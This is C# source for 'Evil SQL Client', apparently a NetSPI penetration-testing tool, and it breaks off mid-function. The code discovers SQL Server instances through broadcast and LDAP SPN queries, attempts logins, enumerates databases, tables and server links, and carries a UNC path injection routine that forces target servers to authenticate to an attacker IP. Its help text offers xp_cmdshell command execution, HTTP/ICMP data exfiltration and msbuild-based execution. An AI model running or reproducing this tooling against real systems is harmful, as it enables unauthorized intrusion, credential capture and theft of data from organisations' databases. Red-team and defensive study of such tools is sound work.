/*
Author: Scott Sutherland(@_nullbind), NetSPI 2020
Version: Version: v1.0
License: 3-clause BSD
Description:
Evil SQL Client(ESC) is an interactive.net SQL console client with enhanced
server discovery, access, and data exfiltration features. :) Built for execution 
as a stand alone assembly, or through a alternative mediums for .net code
execution such as msbuild and PowerShell.While it is a very handy SQL Client 
for legitimate purposes, it was designed for use during penetration testing and
red team engagements.
*/

using System;
using System.IO;
using System.Text;
using System.Data;
using System.Collections.Generic;
using System.Data.Sql;
using System.Data.SqlClient;
using System.Security.Cryptography;
using System.Net.NetworkInformation;
using System.Net;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Linq;

namespace evilsqlclient
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // Run console
            if (0 == args.Length) { while (EvilCommands.RunSQLConsole(null)) { } }



            List<List<string>> allCommands = new List<List<string>>();
            List<string> goList = new List<string>();

            args.ToList()
                .ForEach( i =>
            {
                i.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries)
                 .ToList()
                 .ForEach( j =>
                {
                    goList.Add(j);
                    if (j.Equals("go", StringComparison.OrdinalIgnoreCase))
                    {
                        allCommands.Add(goList);
                        goList.Clear();
                    }                    
                });
            });

            try
            {
                allCommands.ForEach(k => EvilCommands.RunSQLConsole(k.ToArray()));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public class EvilCommands
        {
            // --------------------------------
            // GLOBAL OBJECTS
            // --------------------------------	
            #region globalobjects
            public static DataTable MasterDiscoveredList = new DataTable();
            public static DataTable MasterAccessList = new DataTable();
            public static string ConnectionStringG = "";
            public static bool InstanceAllG = false;
            public static string InstanceG = "";
            public static string UsernameG = "";
            public static string UsertypeG = "CurrentWindowsUser";
            public static string PasswordG = "";
            public static bool ReadyforQueryG = false;
            public static bool ExportFileStateG = false;
            public static string ExportFilePathG = "c:\\windows\\temp\\output.csv";
            public static bool HttpStateG = false;
            public static string HttpUrlG = "http://127.0.0.1";
            public static bool IcmpStateG = false;
            public static string IcmpIpG = "127.0.0.1";
            public static bool EncStateG = false;
            public static string EncKeyG = "AllGoodThings!";
            public static string EncSaltG = "CaptainSalty";
            public static string TimeOutG = "1";
            public static string DiscoveredCountG = "0";
            public static bool VerboseG = false;
            #endregion

            // --------------------------------
            // COMMON FUNCTIONS
            // --------------------------------
            #region commonfunctions

            // --------------------------------
            // FUNCTION: GetHelp
            // --------------------------------		
            public static string GetHelp()
            {
                string help = @"
    -----------------------------------------------------------------------------------------
     Evil SQL Client (ESC)
     Version: v1.0
     License: 3-clause BSD 
     Author: Scott Sutherland (@_nullbind), NetSPI 
     A SQL client with enhanced server discovery, access, and data exfiltration features. :)
     Built for execution as a stand alone assembly, or through an alternative medium for 
     .net code execution such as msbuild and PowerShell. 
    -----------------------------------------------------------------------------------------

    SHOW:
     show settings 			Show connection and exfil settings.
     show discovered 		Show discovered instances. 
     show access  			Show accessible instances, versions, and other information.
     show help 			Show this help page.
 
    CONFIGURE INSTANCE:
     set targetall			Target all accessible SQL Server instances. List with 'show access' command.
     set instance instancename	Target a single instance.  Instance formats supported include: 
 				    server1
 				    server1\instance1
 				    server1,1433
     set connstring stringhere 	Set a custom connection string. Examples below.
				    Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1
				    Server=Server\Instance;Database=Master;Integrated Security=SSPI;Connection Timeout=1;uid=Domain\Account;pwd=Password;
				    Server=Server\Instance;Database=Master;Connection Timeout=1;User ID=Username;Password=Password
 
    CONFIGURE CREDENTIALS:
     set username username 		User for authenticatiing to SQL Server instances.
 				    Defaults to current Windows user if no username or password is provided.
				    Accepts SQL login, local Windows user, or domain user.  
				    example: sqluser
				    example: localhost\localuser
				    example: domain\domainuser
     set password password		Password for the provided username.  
 				    Defaults to current Windows user if no user or password is provided.
 
    QUERY COMMANDS:
     set timeout 1			Set query timeout. Useful over slow connections.
     query				Arbitrary TSQL query can be executed once a valid connection string is configured.
				    To run against all accessible instances type 'set targetall enabled'.
				    Type the query, then go, and press enter. Multi-line queries are supported.
				    Note: You don't have to type the word 'query'.
				    Example:
				    SELECT @@VERSION
				    GO
 
    DISCOVERY COMMANDS:
     discover broadcast		Discover SQL Server instances via a broadcast request.
     discover domainspn		Discover SQL Server instances via LDAP query to the default DC for MSSQL SPNs.
     discover file filepath		Discover SQL Server instance listed in a file.  One per line.
				    Format examples: 
				    hostname 
				    hostname\instance
				    hostname,port
     show discovered		Display the list of discovered SQL Server instances.
     export discovered outpath	Export the list of discovered SQL Server instances to a file. 
				    Example: export discovered c:\windows\temp\sqlinstances.txt
     clear discovered		Clear list of discovered SQL Server instances.

    INITAL ACCESS COMMANDS:
     check access			Attempts to log into all discovered SQL Server instances.  
 				    Uses current Windows/Domain user by default. 
				    Note: Will use alternative credentials if provided. (set username / set password)
     show access			List SQL Server instances that can be logged into.
     export access outpath		Export list of SQL Server instances that can be logged into to a file.
     export access outpath instance Only export the instance names.  Usefull for using with 'discover file' later.
     clear access			Clear the in memory list of SQL Server instances that can be logged into.			
     check defaultlogins		Attempts to identify SQL Server instances that match known application and attempts the associate usernames and passwords.


    POST EXPLOITATION COMMANDS:
     list serverinfo		List server information for accessoble target SQL Server instances.
     list databases			List databases for accessoble target SQL Server instances.
     list tables			List tables information for accessoble target SQL Server instances.
  				    Limits results to databases the login user has access to.
     list links			List links information for accessoble target SQL Server instances.
     list logins			List logins information for accessoble target SQL Server instances.
     list rolemembers		List rolemember information for accessoble target SQL Server instances.
     list privs			Check accessible target SQL Server instances for logins that use their login as a password.  
     check loginaspw     		Check accessible target SQL Server instances for logins that use their login as a password.                         
     check uncinject IP		Connect to taret SQL Server instance and perform UNC injection back to provide IP.	     
     run OSCMD command		Run os command through xp_cmdshell on the accessible target SQL Server instances. 
 				    *Requires sysadmin privileges.
 
    CONFIGURE DATA EXFILTRATION: 
     set file enabled
     set filepath c:\temp\file.csv
     set icmp tenabled
     set icmpip 127.0.0.1
     set http enabled
     set httpurl http://127.0.0.1
     set encrypt enabled
     set enckey MyKey!
     set encsalt MySalt!

    MISC COMMANDS:
     help
     clear
     exit
 
    RECOMMENDED COMMAND SEQUENCE:
     discover domainspn
     discover broadcast
     show discovered
     set targetall enabled
     show settings
     check access
     check defaultpw
     check loginaspw
     show access
     export discovered c:\temp\discovered.csv
     export access c:\temp\access.csv
 
     Execute queries and commands from there.
     Enable data exfiltraiton settings as needed.

    EXAMPLE SCRIPT EXECUTION 
     Run the msbuild.exe command from its path using one of the commands below. 
     You can explicitly define the .xml or .csproj file to load, but it is not required 
     if only one .csproj file exists your current working directory. 
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe 
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.xml
     C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe file.csproj
    ";
                Console.WriteLine(help);
                return null;
            }

            // --------------------------------
            // FUNCTION: GetSQLServerFile
            // --------------------------------
            public static string GetSQLServerFile(string filePath)
            {
                // Status
                Console.WriteLine("\nReading file " + filePath + "\n");

                try
                {
                    // Check for path
                    if (string.IsNullOrEmpty(filePath))
                        throw new ArgumentNullException("filePath");

                    // Open file
                    TextReader tr;
                    tr = File.OpenText(filePath);

                    // Read each line										
                    string Instance;
                    Instance = tr.ReadLine();
                    while (Instance != null)
                    {
                        EvilCommands.MasterDiscoveredList.Rows.Add(Instance, "");
                        Console.WriteLine(Instance);
                        Instance = tr.ReadLine();
                    }

                    // Count lines in the files
                    var lines = System.IO.File.ReadAllLines(filePath);
                    var count = lines.Length;
                    Console.WriteLine("\n" + count + " instances found.");
                }
                catch
                {
                    Console.WriteLine(filePath + " file could not be read.");
                }

                return null;
            }

            // --------------------------------
            // FUNCTION: GetSQLServersBroadCast
            // --------------------------------
            public static string GetSQLServersBroadCast()
            {
                Console.WriteLine("\nSending a broadcast request to identify SQL Server instances.\n");
                SqlDataSourceEnumerator instance = SqlDataSourceEnumerator.Instance;
                DataTable table = instance.GetDataSources();
                int bcount = table.Rows.Count;
                if (bcount > 0)
                {
                    Console.WriteLine("Instance");
                }
                foreach (DataRow row in table.Rows)
                {
                    if (row["ServerName"] != DBNull.Value && Environment.MachineName.Equals(row["ServerName"].ToString()))
                    {
                        string Instance = row["ServerName"].ToString();
                        if (row["InstanceName"] != DBNull.Value || !string.IsNullOrEmpty(Convert.ToString(row["InstanceName"]).Trim()))
                        {
                            Instance += @"\" + Convert.ToString(row["InstanceName"]).Trim();
                        }
                        EvilCommands.MasterDiscoveredList.Rows.Add(Instance, "");
                        Console.WriteLine(Instance);
                    }

                    // Display output of data table
                    DataRow[] currentRows = table.Select(null, null, DataViewRowState.CurrentRows);
                }

                if (bcount < 1)
                {
                    Console.WriteLine("No SQL Servers responded to broadcast requests.");
                }
                else
                {
                    Console.WriteLine("\n" + bcount + " SQL Servers responded to broadcast requests.");
                }
                return null;
            }

            // --------------------------------
            // FUNCTION: GetSQLServersSpn
            // --------------------------------
            public static string GetSQLServersSpn()
            {
                // Create data table to store and display output
                DataTable mytable = new DataTable();
                mytable.Clear();
                mytable.Columns.Add("Instance");
                mytable.Columns.Add("SamAccountName");
                // mytable.Columns.Add("servicePrincipalName");

                // Setup LDAP query                
                Domain DomainInfo = Domain.GetCurrentDomain();
                string MyDC = DomainInfo.PdcRoleOwner.Name;

                DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC, null, null, AuthenticationTypes.SecureSocketsLayer);
                //DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":636", null, null, AuthenticationTypes.SecureSocketsLayer);
                //DirectoryEntry RootDirEntry = new DirectoryEntry("LDAP://" + MyDC + ":389", null, null);
                RootDirEntry.AuthenticationType = AuthenticationTypes.Secure;

                // Status user
                Console.WriteLine("\nQuerying " + MyDC + " domain controller for SQL Server SPNs.\n");

                // Execute Query
                try
                {
                    using (DirectorySearcher ds = new DirectorySearcher(RootDirEntry))
                    {                                            
                        ds.Filter = "(servicePrincipalName=*mssql*)";
                        ds.SearchScope = System.DirectoryServices.SearchScope.Subtree;
                        ds.PageSize = 1000;
                        using (SearchResultCollection src = ds.FindAll())
                        {
                            foreach (SearchResult sr in src)
                            {
                                try
                                {
                                    foreach (string spn in sr.Properties["servicePrincipalName"])
                                    {

                                        // Grab properties
                                        string SamAccountName = sr.Properties["sAMAccountName"][0].ToString();
                                        int spnindex = spn.IndexOf('/');
                                        string ServiceType = spn.Substring(0, spnindex);
                                        string partialInstance = spn.Substring(spnindex + 1);

                                        // Parse instance
                                        try
                                        {
                                            int instanceindex = partialInstance.IndexOf(':');
                                            string computerName = partialInstance.Substring(0, instanceindex);
                                            string instancePart = partialInstance.Substring(instanceindex + 1);
                                            string instanceName = computerName + "\\" + instancePart;

                                            // Add comma for ports
                                            decimal myDec;
                                            var isNumber = decimal.TryParse(instancePart, out myDec);
                                            if (isNumber)
                                            {
                                                instanceName = instanceName.Replace("\\", ",");
                                            }

                                            // Add record to output table
                                            if (ServiceType.ToLower().Contains("mssql"))
                                            {
                                                mytable.Rows.Add(new object[] { instanceName, SamAccountName });
                                                EvilCommands.MasterDiscoveredList.Rows.Add(instanceName, SamAccountName);
                                            }
                                        }
                                        catch
                                        {
                                        }
                                    }
                                }
                                catch
                                {
                                }
                            }
                        }
                    }

                    // Display output of data table
                    int linewidth = 50;
                    string columnValue = "";
                    string spaces = "";
                    int tabNumber = 1;
                    DataRow[] currentRows = mytable.Select(null, null, DataViewRowState.CurrentRows);
                    if (currentRows.Length < 1)
                    {
                        Console.WriteLine("\nNo rows returned.\n");
                    }
                    else
                    {

                        // Display columns
                        foreach (DataColumn column in mytable.Columns)
                        {
                            // Pad column
                            columnValue = column.ColumnName.ToString();
                            if (columnValue.Length < linewidth)
                            {
                                tabNumber = linewidth - columnValue.Length;
                                spaces = new String(' ', tabNumber);
                            }
                            else
                            {
                                tabNumber = 1;
                            }

                            Console.Write(column.ColumnName + spaces);
                        }

                        Console.WriteLine("\t");

                        // Display rows
                        foreach (DataRow row in currentRows)
                        {
                            foreach (DataColumn column in mytable.Columns)
                            {
                                // Pad column to 50 characters
                                columnValue = row[column].ToString();
                                if (columnValue.Length < linewidth)
                                {
                                    tabNumber = linewidth - columnValue.Length;
                                    spaces = new String(' ', tabNumber);
                                }
                                else
                                {
                                    tabNumber = 1;
                                }

                                Console.Write(row[column] + spaces);
                            }
                            Console.WriteLine("\t");
                        }
                    }

                    Console.WriteLine("\n" + mytable.Rows.Count + " instances found.");
                }
                catch
                {
                    Console.WriteLine("Unable to connect to " + MyDC + ".");
                }
                return null;
            }

            // --------------------------------
            // FUNCTION: EncryptStringAES
            // --------------------------------
            // Set salt - May not want the salt to be static long term :P
            private static byte[] _salt = Encoding.Unicode.GetBytes(EncSaltG);
            public static string EncryptStringAES(string plainText, string sharedSecret)
            {
                if (string.IsNullOrEmpty(plainText))
                    throw new ArgumentNullException("plainText");
                if (string.IsNullOrEmpty(sharedSecret))
                    throw new ArgumentNullException("sharedSecret");

                string outStr = null;                       // Encrypted string to return
                RijndaelManaged aesAlg = null;              // RijndaelManaged object used to encrypt the data.

                try
                {
                    // generate the key from the shared secret and the salt
                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);

                    // Create a RijndaelManaged object
                    aesAlg = new RijndaelManaged();
                    aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                    aesAlg.Mode = CipherMode.ECB;

                    // Create a decryptor to perform the stream transform.
                    ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                    // Create the streams used for encryption.
                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        // prepend the IV
                        msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
                        msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                        using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        {
                            using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                            {
                                //Write all data to the stream.
                                swEncrypt.Write(plainText);
                            }
                        }
                        outStr = Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
                finally
                {
                    // Clear the RijndaelManaged object.
                    if (aesAlg != null)
                        aesAlg.Clear();
                }

                // Return the encrypted bytes from the memory stream.
                return outStr;
            }

            // --------------------------------
            // FUNCTION: DecryptStringAES
            // --------------------------------
            public static string DecryptStringAES(string cipherText, string sharedSecret)
            {
                if (string.IsNullOrEmpty(cipherText))
                    throw new ArgumentNullException("cipherText");
                if (string.IsNullOrEmpty(sharedSecret))
                    throw new ArgumentNullException("sharedSecret");

                // Declare the RijndaelManaged object
                // used to decrypt the data.
                RijndaelManaged aesAlg = null;

                // Declare the string used to hold
                // the decrypted text.
                string plaintext = null;

                try
                {
                    // generate the key from the shared secret and the salt
                    Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);

                    // Create the streams used for decryption.                
                    byte[] bytes = Convert.FromBase64String(cipherText);
                    using (MemoryStream msDecrypt = new MemoryStream(bytes))
                    {
                        // Create a RijndaelManaged object
                        // with the specified key and IV.
                        aesAlg = new RijndaelManaged();
                        aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                        aesAlg.Mode = CipherMode.ECB;

                        // Get the initialization vector from the encrypted stream
                        aesAlg.IV = ReadByteArray(msDecrypt);
                        // Create a decrytor to perform the stream transform.
                        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))

                                // Read the decrypted bytes from the decrypting stream
                                // and place them in a string.
                                plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
                finally
                {
                    // Clear the RijndaelManaged object.
                    if (aesAlg != null)
                        aesAlg.Clear();
                }

                return plaintext;
            }

            // --------------------------------
            // FUNCTION: ReadByteArray
            // --------------------------------
            private static byte[] ReadByteArray(Stream s)
            {
                byte[] rawLength = new byte[sizeof(int)];
                if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
                {
                    throw new SystemException("Stream did not contain properly formatted byte array");
                }

                byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
                if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
                {
                    throw new SystemException("Did not read byte array properly");
                }

                return buffer;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTDATABASE
            // ------------------------------------------------------------
            public static string ListDatabase()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int databaseCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT      @@SERVERNAME  as [ComputerName],
							    @@SERVICENAME as [Instance],
							    a.database_id as [DatabaseId],
							    a.name        as [DatabaseName],
							    SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
							    IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
							    a.is_trustworthy_on,
							    a.is_db_chaining_on,            
							    a.create_date,
							    a.recovery_model_desc,
							    b.filename as [FileName],
							    (select CASE WHEN SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) > '9' THEN a.is_broker_enabled ELSE 0 END) as isBrokerEnabled,
							    (select CASE WHEN SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) > '9' THEN a.is_encrypted ELSE 0 END) as isEncrypted,
							    (select CASE WHEN SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) > '9' THEN a.is_read_only ELSE 0 END) as isReadonly,
							    (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
							    from sys.master_files where name like a.name) as [DbSizeMb],
							    HAS_DBACCESS(a.name) as [has_dbaccess]
							    FROM [sys].[databases] a
							    INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid
							    ORDER BY a.database_id";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("DbID              : " + CurrentRecord["DatabaseId"].ToString());
                                Console.WriteLine("DatabaseName      : " + CurrentRecord["DatabaseName"].ToString());
                                Console.WriteLine("Owner             : " + CurrentRecord["DatabaseOwner"].ToString());
                                Console.WriteLine("Owner is sysadmin : " + CurrentRecord["OwnerIsSysadmin"].ToString());
                                Console.WriteLine("CreateDate        : " + CurrentRecord["create_date"].ToString());
                                Console.WriteLine("RecoveryModel     : " + CurrentRecord["recovery_model_desc"].ToString());
                                Console.WriteLine("IsTrustworthy     : " + CurrentRecord["is_trustworthy_on"].ToString());
                                Console.WriteLine("IsDbChaining      : " + CurrentRecord["is_db_chaining_on"].ToString());
                                Console.WriteLine("isBrokerEnabled   : " + CurrentRecord["isBrokerEnabled"].ToString());
                                Console.WriteLine("isEncrypted       : " + CurrentRecord["isEncrypted"].ToString());
                                Console.WriteLine("isReadOnly        : " + CurrentRecord["isReadonly"].ToString());
                                Console.WriteLine("Database Size     : " + CurrentRecord["DbSizeMb"].ToString());

                                // Increase counter
                                databaseCount = databaseCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + databaseCount + " databases found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTTABLE
            // ------------------------------------------------------------
            public static string ListTable()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int tableCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");


                    // Loops through target instances 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");

                        // Get database list
                        Console.WriteLine("GRABBING LIST OF DATABASES");
                        DataTable Databases = new DataTable();
                        try
                        {
                            string ConnectionStringdb = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
                            string DatabaseQuery = "SELECT name FROM master..sysdatabases WHERE HAS_DBACCESS(name) = 1";
                            SqlConnection conndb = new SqlConnection(ConnectionStringdb);
                            SqlCommand DbQueryOutput = new SqlCommand(DatabaseQuery, conndb);
                            conndb.Open();
                            SqlDataAdapter dadb = new SqlDataAdapter(DbQueryOutput);
                            dadb.Fill(Databases);
                            conndb.Close();
                        }
                        catch
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                        }

                        foreach (DataRow CurrentDatabase in Databases.Select())
                        {
                            // Get table list
                            Console.WriteLine("\nGRABBING LIST OF TABLES FOR " + CurrentDatabase["Name"].ToString());
                            try
                            {
                                // Setup connection string
                                string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                                // Execute query									
                                string fullcommand = @"
								    SELECT  @@SERVERNAME as ComputerName,
								    @@SERVICENAME as Instance,
								    TABLE_CATALOG AS DatabaseName,
								    TABLE_SCHEMA AS SchemaName,
								    TABLE_NAME as TableName,
								    TABLE_TYPE as TableType
								    FROM [" + CurrentDatabase["Name"].ToString() + @"].[INFORMATION_SCHEMA].[TABLES]								
								    ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME";

                                SqlConnection conn = new SqlConnection(ConnectionString);
                                SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                                conn.Open();

                                // Read data into data table
                                DataTable dt = new DataTable();
                                SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                                da.Fill(dt);

                                foreach (DataRow CurrentRecord in dt.Select())
                                {

                                    // Display SQL Server information									
                                    Console.WriteLine("\nComputer Name   : " + CurrentRecord["ComputerName"].ToString());
                                    Console.WriteLine("Instance        : " + CurrentRecord["Instance"].ToString());
                                    Console.WriteLine("Database        : " + CurrentRecord["DatabaseName"].ToString());
                                    Console.WriteLine("Schema          : " + CurrentRecord["SchemaName"].ToString());
                                    Console.WriteLine("Table Name      : " + CurrentRecord["TableName"].ToString());
                                    Console.WriteLine("Table Type      : " + CurrentRecord["TableType"].ToString());

                                    // Increase counter
                                    tableCount = tableCount + 1;
                                }
                            }
                            catch (SqlException ex)
                            {
                                Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                                if (VerboseG)
                                {
                                    Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                }
                            }
                        }
                    }

                    Console.WriteLine("\n" + tableCount + " tables found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: LISTLINKS
            // ------------------------------------------------------------
            public static string ListLinks()
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int linkCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
                        try
                        {
                            // Setup connection string
                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");

                            // Execute query							
                            string fullcommand = @"
							    SELECT      @@SERVERNAME as [ComputerName],
							    @@SERVICENAME as [Instance],
							    a.server_id as [LinkId],
							    a.name AS [LinkName],
							    CASE a.Server_id
							    WHEN 0
							    THEN 'Local'
							    ELSE 'Remote'
							    END AS [DatabaseLinkLocation],
							    a.product as [Product],
							    a.provider as [Provider],
							    a.catalog as [Catalog],
							    'LocalLogin' = CASE b.uses_self_credential
							    WHEN 1 THEN 'Uses Self Credentials'
							    ELSE c.name
							    END,
							    b.remote_name AS [RemoteLoginName],
							    a.is_rpc_out_enabled,
							    a.is_data_access_enabled,
							    a.modify_date
							    FROM [Master].[sys].[Servers] a
							    LEFT JOIN [Master].[sys].[linked_logins] b
							    ON a.server_id = b.server_id
							    LEFT JOIN [Master].[sys].[server_principals] c
							    ON c.principal_id = b.local_principal_id";

                            SqlConnection conn = new SqlConnection(ConnectionString);
                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
                            conn.Open();

                            // Read data into data table
                            DataTable dt = new DataTable();
                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
                            da.Fill(dt);

                            foreach (DataRow CurrentRecord in dt.Select())
                            {

                                // Display SQL Server information
                                Console.WriteLine("\nComputer Name     : " + CurrentRecord["ComputerName"].ToString());
                                Console.WriteLine("Instance          : " + CurrentRecord["Instance"].ToString());
                                Console.WriteLine("Link ID           : " + CurrentRecord["LinkId"].ToString());
                                Console.WriteLine("Link Name         : " + CurrentRecord["LinkName"].ToString());
                                Console.WriteLine("Link Location     : " + CurrentRecord["DatabaseLinkLocation"].ToString());
                                Console.WriteLine("Product           : " + CurrentRecord["Product"].ToString());
                                Console.WriteLine("Provider          : " + CurrentRecord["Provider"].ToString());
                                Console.WriteLine("Catalog           : " + CurrentRecord["Catalog"].ToString());
                                Console.WriteLine("RemoteLoginName   : " + CurrentRecord["RemoteLoginName"].ToString());
                                Console.WriteLine("RPC Out           : " + CurrentRecord["is_rpc_out_enabled"].ToString());
                                Console.WriteLine("Data Access       : " + CurrentRecord["is_data_access_enabled"].ToString());
                                Console.WriteLine("Modify Date       : " + CurrentRecord["modify_date"].ToString());

                                // Increase counter
                                linkCount = linkCount + 1;
                            }
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
                            if (VerboseG)
                            {
                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                            }
                        }
                    }
                    Console.WriteLine("\n" + linkCount + " server links found.");
                }
                else
                {
                    Console.WriteLine("\nNo target instances have been defined.");
                }
                return null;
            }

            // ------------------------------------------------------------
            // FUNCTION: CHECKUNCPATHINJECTION
            // ------------------------------------------------------------
            public static string CheckUncPathInjection(string attackerip)
            {
                CheckQueryReady();
                if (ReadyforQueryG)
                {
                    // Create data table 
                    IList<string> TargetList = new List<string>();

                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
                    // Add all
                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
                    DataTable distinctValues = AccessView.ToTable(true, "Instance");
                    if (InstanceAllG)
                    {
                        foreach (DataRow CurrentRecord in distinctValues.Select())
                        {
                            TargetList.Add(CurrentRecord["Instance"].ToString());
                        }
                    }

                    // Add instance
                    if (!InstanceG.Equals(""))
                    {
                        TargetList.Add(InstanceG);
                    }

                    // Get list count
                    var count = TargetList.Count;
                    int linkCount = 0;
                    Console.WriteLine("\n" + count + " instances will be targeted.");

                    // Loop through target list 
                    foreach (var instance in TargetList)
                    {
                        string fullcommand = @"xp_fileexist '\\" + attackerip + "\\file'";
                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY: " + fullcommand);
                        try
                        {
